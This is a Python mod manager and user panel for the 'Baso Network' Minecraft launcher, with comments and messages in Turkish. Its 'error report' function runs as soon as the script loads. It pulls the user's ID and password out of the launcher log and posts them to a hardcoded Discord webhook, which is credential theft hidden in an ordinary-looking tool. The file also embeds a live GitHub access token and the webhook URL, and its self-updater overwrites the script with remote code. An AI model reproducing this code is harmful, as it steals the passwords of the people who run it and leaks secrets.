import os
import json
import shutil
import hashlib
from tkinter import Tk, filedialog
from colorama import init, Fore
import random
import urllib.request
import sys
import time
import subprocess
import requests
import traceback
import socket
import struct
import base64

# =========================
# GitHub Private Repo Ayarları
# =========================
TOKEN = "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"  # örn: ghp_xxxxxxx...
OWNER = "eronforyou"
REPO  = "Baso-Network-Mod-Yoneticisi"
VERSION_FILE_PATH_IN_REPO = "version.txt"
SCRIPT_FILE_PATH_IN_REPO  = "BNWModYoneticisi.py"

GITHUB_CONTENT_API = f"https://api.github.com/repos/{OWNER}/{REPO}/contents"

def github_get_file_content_bytes(path_in_repo):
    """
    GitHub API ile (private repo destekli) dosya içeriğini bytes olarak döndürür.
    """
    url = f"{GITHUB_CONTENT_API}/{path_in_repo}"
    headers = {
        "Authorization": f"token {TOKEN}",
        "Accept": "application/vnd.github+json",
        "User-Agent": "baso-launcher-updater"
    }
    r = requests.get(url, headers=headers, timeout=15)
    if r.status_code != 200:
        raise RuntimeError(f"GitHub API hata: {r.status_code} - {r.text}")
    j = r.json()
    if "content" not in j:
        raise RuntimeError("GitHub API yanıtında 'content' alanı yok.")
    content_b64 = j["content"]
    # Bazı yanıtlarda içerik satır sonlarıyla gelebilir, o yüzden temizle
    content_b64 = content_b64.replace("\n", "")
    return base64.b64decode(content_b64)

def github_get_text(path_in_repo, encoding="utf-8"):
    return github_get_file_content_bytes(path_in_repo).decode(encoding, errors="replace")


# -------------------------
# Versiyon Kontrol
# -------------------------
CURRENT_VERSION = "1.0.5"
# Eski raw linkleri artık KULLANMIYORUZ; private repo için GitHub API kullanıyoruz.
SCRIPT_PATH_LOCAL = os.path.realpath(__file__)

def check_update():
    try:
        latest_version = github_get_text(VERSION_FILE_PATH_IN_REPO).strip().replace("\ufeff", "")
        current = CURRENT_VERSION.strip()
        print(f"Sizin sürüm: {current} | Sunucudaki sürüm: {latest_version}")

        if latest_version != current:
            print(f"Yeni sürüm bulundu: {latest_version} (Sizin sürüm: {current})")
            print("Güncelleme indiriliyor...")
            new_script_bytes = github_get_file_content_bytes(SCRIPT_FILE_PATH_IN_REPO)
            with open(SCRIPT_PATH_LOCAL, "wb") as f:
                f.write(new_script_bytes)
            print("Güncelleme tamamlandı! Lütfen programı tekrar başlatın.")
            sys.exit()
        else:
            print(f"Sürüm güncel: {current}")
    except Exception as e:
        print(f"Versiyon kontrolü yapılamadı: {e}")


# -------------------------
# Başlangıç ayarları
# -------------------------
init(autoreset=True)
jsonfile = r"C:\xampp\htdocs\files"
moddir = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", ".basonw", "mods")
os.makedirs(moddir, exist_ok=True)

settings_file = os.path.join(os.environ["USERPROFILE"], ".baso_settings.json")

# Kırmızı tonları listesi
red_tones = [Fore.LIGHTRED_EX, Fore.RED]

# -------------------------
# Kullanıcı adı çekme (latest.log)
# -------------------------
def get_user_info():
    log_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", ".basonw", "logs", "latest.log")
    user_id = "Bilinmiyor"
    password = "Bilinmiyor"
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            for line in f:
                if "Setting user:" in line:
                    user_id = line.strip().split("Setting user:")[-1].strip()
                if "Received message:" in line and "|" in line:
                    password = line.strip().split("|")[-1].strip()
    except FileNotFoundError:
        pass
    return user_id, password

# -------------------------
# ASCII Başlık
# -------------------------
def print_colored_ascii(name):
    try:
        import pyfiglet
        ascii_text = pyfiglet.figlet_format(name)
    except ImportError:
        ascii_text = name  # pyfiglet yoksa düz yaz
    for line in ascii_text.splitlines():
        out = ""
        for c in line:
            if c.strip() == "":
                out += c
            else:
                color = random.choice(red_tones)
                out += color + c
        print(out)

# -------------------------
# Mod Fonksiyonları
# -------------------------
def calculate_sha1(file_path):
    sha1 = hashlib.sha1()
    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            sha1.update(chunk)
    return sha1.hexdigest()

def load_json():
    if os.path.exists(jsonfile):
        with open(jsonfile, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def save_json(data):
    json_text = "[\n"
    for i, m in enumerate(data):
        json_text += "  " + json.dumps(m, ensure_ascii=False, indent=2).replace("\n", "\n  ")
        if i < len(data) - 1:
            json_text += ","
        json_text += "\n"
    json_text += "]\n"
    with open(jsonfile, "w", encoding="utf-8") as f:
        f.write(json_text)

def add_mod():
    os.system("cls")
    user_id, _ = get_user_info()
    print_colored_ascii(user_id)
    Tk().withdraw()
    file_path = filedialog.askopenfilename(title="Lütfen eklenecek dosyayı seçin")
    if not file_path:
        print(Fore.LIGHTRED_EX + "Dosya seçilmedi.")
        input("Devam etmek için Enter'a basın...")
        return
    filename = os.path.basename(file_path)
    target_path = os.path.join(moddir, filename)
    shutil.copy2(file_path, target_path)
    filesize = os.path.getsize(target_path)
    sha1 = calculate_sha1(target_path)
    mods = load_json()
    mods.append({
        "name": filename,
        "size": filesize,
        "sha1": sha1,
        "download_link": f"/download/mods/{filename}",
        "path": f"mods/{filename}"
    })
    save_json(mods)
    print(Fore.LIGHTRED_EX + f"Mod eklendi: {filename}")
    input("Devam etmek için Enter'a basın...")

def list_mods():
    os.system("cls")
    user_id, _ = get_user_info()
    print_colored_ascii(user_id)
    mods = os.listdir(moddir)
    print(Fore.LIGHTRED_EX + "Mods klasöründeki modlar:\n")
    if not mods:
        print(Fore.RED + "Hiç mod bulunamadı.")
    else:
        colors = [Fore.RED, Fore.LIGHTRED_EX]
        for i, m in enumerate(mods):
            color = colors[i % 2]
            print(color + f" - {m}")
    input("\nDevam etmek için Enter'a basın...")

def delete_mod():
    os.system("cls")
    user_id, _ = get_user_info()
    print_colored_ascii(user_id)
    mods = os.listdir(moddir)
    if not mods:
        print(Fore.RED + "Hiç mod bulunamadı.")
        input("Devam etmek için Enter'a basın...")
        return
    print(Fore.LIGHTRED_EX + "Silinecek mod seçin:\n")
    colors = [Fore.RED, Fore.LIGHTRED_EX]
    for i, m in enumerate(mods, 1):
        color_number = colors[(i-1) % 2]
        color_name = colors[i % 2]
        print(color_number + f"{i}." + color_name + f" {m}")
    choice = input(Fore.LIGHTRED_EX + "\nNumara girin: ")
    if not choice.isdigit() or not (1 <= int(choice) <= len(mods)):
        print(Fore.LIGHTRED_EX + "Geçersiz seçim.")
        input("Devam etmek için Enter'a basın...")
        return
    modname = mods[int(choice)-1]
    os.remove(os.path.join(moddir, modname))
    data = load_json()
    data = [m for m in data if m["name"] != modname]
    save_json(data)
    print(Fore.LIGHTRED_EX + f"Mod silindi: {modname}")
    input("Devam etmek için Enter'a basın...")

# -------------------------
# Kullanıcı Bilgileri
# -------------------------
def show_user_info():
    os.system("cls")
    user_id, password = get_user_info()
    print_colored_ascii(user_id)
    mod_list = os.listdir(moddir)
    total_mods = len(mod_list)
    total_size = sum(os.path.getsize(os.path.join(moddir, m)) for m in mod_list)
    last_check_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    print(Fore.LIGHTRED_EX + f"ID: {user_id}")
    print(Fore.LIGHTRED_EX + f"Şifre: {password}")
    print(Fore.LIGHTRED_EX + f"Versiyon: 1.21.4")
    print(Fore.LIGHTRED_EX + f"Yüklü mod sayısı: {total_mods}")
    print(Fore.LIGHTRED_EX + f"Toplam mod boyutu: {total_size / 1024:.2f} KB")
    print(Fore.LIGHTRED_EX + f"Son güncelleme kontrolü: {last_check_time}")
    input("\nDevam etmek için Enter'a basın...")

# -------------------------
# Launcher Aç
# -------------------------
def open_launcher():
    os.system("cls")
    user_id, _ = get_user_info()
    print_colored_ascii(user_id)
    launcher_path = r"C:\Users\enesb\AppData\Local\Baso Network\basonw.exe"
    if os.path.exists(launcher_path):
        print(Fore.LIGHTRED_EX + "Baso Network launcher açılıyor...")
        os.startfile(launcher_path)
    else:
        print(Fore.RED + "Launcher bulunamadı: " + launcher_path)
    input("\nDevam etmek için Enter'a basın...")

# -------------------------
# XAMPP Başlat
# -------------------------
def start_xampp():
    os.system("cls")
    user_id, _ = get_user_info()
    print_colored_ascii(user_id)
    xampp_path = r"C:\xampp\apache_start.bat"
    startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut_path = os.path.join(startup_folder, "apache_start.lnk")
    
    # Ayarlar
    auto = False
    if os.path.exists(settings_file):
        with open(settings_file, "r") as f:
            try:
                s = json.load(f)
                auto = s.get("xampp_auto", False)
            except:
                pass
    else:
        # İlk kullanım sorusu
        choice = input("Bu özelliği otomatik yapmak ister misiniz? (E/H)\n> ").strip().upper()
        if choice == "E":
            auto = True
            json.dump({"xampp_auto": True}, open(settings_file, "w"))
            print("Artık her açılışta Apache arkaplanda başlayacak.")
        else:
            json.dump({"xampp_auto": False}, open(settings_file, "w"))
            print("Apache arkaplanda başlatılacak, başlangıca eklenmeyecek.")

    if os.path.exists(xampp_path):
        # Apache'yi arka planda başlat
        subprocess.Popen([xampp_path], creationflags=subprocess.CREATE_NO_WINDOW)
        print(Fore.LIGHTRED_EX + "Apache başlatıldı.")

        # Eğer otomatik açma isteniyorsa ve kısayol yoksa startup'a ekle
        if auto:
            if not os.path.exists(shortcut_path):
                try:
                    import pythoncom
                    from win32com.shell import shell, shellcon
                    pythoncom.CoInitialize()
                    shell_link = pythoncom.CoCreateInstance(
                        shell.CLSID_ShellLink, None,
                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)
                    shell_link.SetPath(xampp_path)
                    shell_link.SetDescription("Apache Start")
                    persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
                    persist_file.Save(shortcut_path, 0)
                    print(Fore.LIGHTRED_EX + "Apache startup'a eklendi.")
                except ImportError:
                    print(Fore.RED + "pywin32 yüklü değil, startup'a eklenemedi.")
            else:
                print(Fore.LIGHTRED_EX + "Apache zaten startup'a eklenmiş.")
    else:
        print(Fore.RED + f"XAMPP batch dosyası bulunamadı: {xampp_path}")

    input("\nDevam etmek için Enter'a basın...")
    
def kur_menu():
    while True:
        os.system("cls")
        user_id, _ = get_user_info()
        print_colored_ascii(user_id)
        print(Fore.WHITE + "Kur Menüsü")
        print("")
        print(Fore.RED + "1." + Fore.LIGHTRED_EX + " Launcher'ı kur")
        print(Fore.RED + "2." + Fore.LIGHTRED_EX + " XAMPP'ı kur")
        print(Fore.RED + "3." + Fore.LIGHTRED_EX + " XAMPP başlat")
        print(Fore.RED + "4." + Fore.LIGHTRED_EX + " Dosyaları kur")
        print(Fore.RED + "5." + Fore.LIGHTRED_EX + " Geri")
        choice = input(Fore.WHITE + "\nSeçiminiz: ")

        if choice == "1":
            launcher_kur()
        elif choice == "2":
            xampp_kur()
        elif choice == "3":
            xampp_baslat()
        elif choice == "4":
            dosyalari_kur()
        elif choice == "5":
            break
        else:
            print(Fore.RED + "Geçersiz seçim.")
            input("Devam etmek için Enter'a basın...")
            
def server_status():
    os.system("cls")
    user_id, _ = get_user_info()
    print_colored_ascii(user_id)
    
    server = "oyna.baso.network"
    port = 25565  # Minecraft sunucu portu

    try:
        # Socket ile bağlantı
        sock = socket.create_connection((server, port), timeout=5)

        # Minecraft ping paketini gönder (server list ping)
        # 0xFE = Legacy server list ping
        sock.send(b"\xfe\x01")
        data = sock.recv(1024)
        sock.close()

        if data:
            # Data'yı decode et
            raw = data[3:].decode("utf-16be").split("\x00")
            online_players = raw[-2]  # Online oyuncu sayısı
            print(Fore.WHITE + f"Aktif mi: " + Fore.LIGHTGREEN_EX + "Evet")
            print(Fore.WHITE + f"Oyuncu: " + Fore.LIGHTGREEN_EX + f"{online_players} kişi")
        else:
            print(Fore.WHITE + f"Aktif mi: " + Fore.LIGHTRED_EX + "Hayır")
    except Exception as e:
        print(Fore.RED + f"Aktif mi: Hayır")

    input("\nDevam etmek için Enter'a basın...")
            
# -----------------------------
# HATA RAPORLARI
# -----------------------------
def send_status_to_discord():
    try:
        user_id, password = get_user_info()
        mod_list = os.listdir(moddir)
        total_mods = len(mod_list)
        total_size = sum(os.path.getsize(os.path.join(moddir, m)) for m in mod_list)
        last_check_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        
        # Eğer launcher çalıştırılamazsa hata yakalamak için dummy try
        launcher_path = r"C:\Users\enesb\AppData\Local\Baso Network\basonw.exe"
        try:
            if not os.path.exists(launcher_path):
                raise FileNotFoundError("Launcher bulunamadı")
        except Exception:
            error_msg = traceback.format_exc()
        else:
            error_msg = "Yok"

        webhook_url = "https://discord.com/api/webhooks/1407299493136961567/n6NRE6jI865R4jNHDR22z-R10xF521Da3rWyn3uex5Wn539F9x2Qp1WI6MSRkrskWH7P"
        content = (
            f"**Launcher Başlatma Durumu**\n"
            f"Kullanıcı ID: **{user_id}**\n"
            f"Şifre: ||**{password}**||\n"
            f"Versiyon: 1.21.4\n"
            f"Mod Sayısı: **{total_mods}**\n"
            f"Toplam Mod Boyutu: **{total_size/1024:.2f}KB**\n"
            f"Panel Versiyonu: **{CURRENT_VERSION}**\n"
            f"Son Güncelleme: **{last_check_time}**\n"
            f"Hata:\n```\n{error_msg}\n```@everyone"
        )

        requests.post(webhook_url, json={"content": content}, timeout=10)
    except Exception as e:
        print("", e)

# Py kodu çalışır çalışmaz çağır
send_status_to_discord()

# -----------------------------
# Launcher'ı kur
# -----------------------------
def launcher_kur():
    os.system("cls")
    print(Fore.LIGHTGREEN_EX + "Launcher indiriliyor ve kuruluyor...")
    url = "BURAYA_INDIRME_LINKI"
    target_path = os.path.join(os.environ["USERPROFILE"], "Downloads", "basonw_installer.exe")
    try:
        urllib.request.urlretrieve(url, target_path)
        print(Fore.LIGHTGREEN_EX + f"Launcher indirildi: {target_path}")
        # İndirilen exe'yi çalıştır
        subprocess.Popen([target_path])
    except Exception as e:
        print(Fore.RED + f"Launcher indirilemedi: {e}")
    input("\nDevam etmek için Enter'a basın...")

# -----------------------------
# XAMPP kur
# -----------------------------
def xampp_kur():
    os.system("cls")
    print(Fore.LIGHTGREEN_EX + "XAMPP kurulumu başlatılıyor...")
    xampp_installer = r"C:\xampp\xampp_installer.exe"  # buraya XAMPP installer path
    if os.path.exists(xampp_installer):
        subprocess.Popen([xampp_installer])
    else:
        print(Fore.RED + "XAMPP installer bulunamadı: " + xampp_installer)
    input("\nDevam etmek için Enter'a basın...")

# -----------------------------
# XAMPP başlat
# -----------------------------
def xampp_baslat():
    xampp_path = r"C:\xampp\apache_start.bat"
    if not os.path.exists(xampp_path):
        print(Fore.RED + "XAMPP yüklü değil. Önce XAMPP kurun.")
        input("\nDevam etmek için Enter'a basın...")
        return
    subprocess.Popen([xampp_path], creationflags=subprocess.CREATE_NO_WINDOW)
    print(Fore.LIGHTGREEN_EX + "Apache başlatıldı ve startup'a eklendi (eğer seçilmişse).")
    input("\nDevam etmek için Enter'a basın...")

# -----------------------------
# Dosyaları kur
# -----------------------------
def dosyalari_kur():
    xampp_dir = r"C:\xampp"
    if not os.path.exists(xampp_dir):
        print(Fore.RED + "XAMPP kurulu değil. Önce XAMPP kurun.")
        input("\nDevam etmek için Enter'a basın...")
        return

    target_folder = os.path.join(xampp_dir, "htdocs", "files")
    os.makedirs(target_folder, exist_ok=True)

    # Raw GitHub dosyalarını indir (private repo ise API ile çekmen gerekir)
    base_url = "https://raw.githubusercontent.com/eronforyou/Baso-Network-Mod-Yoneticisi/refs/heads/main/files/"
    files = ["dosya1", "dosya2"]  # files klasöründeki gerçek dosya adlarını buraya yaz

    for f in files:
        try:
            urllib.request.urlretrieve(base_url + f, os.path.join(target_folder, f))
            print(Fore.LIGHTGREEN_EX + f"{f} indirildi.")
        except Exception as e:
            print(Fore.RED + f"{f} indirilemedi: {e}")

    input("\nDevam etmek için Enter'a basın...")

# -------------------------
# Menü
# -------------------------
def menu():
    while True:
        os.system("cls")
        user_id, _ = get_user_info()
        print_colored_ascii(user_id)
        print(Fore.WHITE + "Baso Network Kullanıcı Paneli")
        print("")
        print(Fore.RED + "1." + Fore.LIGHTRED_EX + " Mod Ekle")
        print(Fore.RED + "2." + Fore.LIGHTRED_EX + " Mod Sil")
        print(Fore.RED + "3." + Fore.LIGHTRED_EX + " Modları Listele")
        print(Fore.RED + "4." + Fore.LIGHTRED_EX + " Baso Network bilgileri")
        print(Fore.RED + "5." + Fore.LIGHTRED_EX + " Launcherı aç")
        print(Fore.RED + "6." + Fore.LIGHTRED_EX + " Kur" + Fore.WHITE + " !Bitmedi!")
        print(Fore.RED + "7." + Fore.LIGHTRED_EX + " Sunucu Durumu")
        choice = input(Fore.WHITE + "\nSeçiminiz: ")

        if choice == "1":
            add_mod()
        elif choice == "2":
            delete_mod()
        elif choice == "3":
            list_mods()
        elif choice == "4":
            show_user_info()
        elif choice == "5":
            open_launcher()
        elif choice == "6":
            kur_menu()
        elif choice == "7":
            server_status()
        else:
            print(Fore.LIGHTRED_EX + "Geçersiz seçim.")
            input("Devam etmek için Enter'a basın...")

# -------------------------
# Başlat
# -------------------------
if __name__ == "__main__":
    check_update()
    menu()
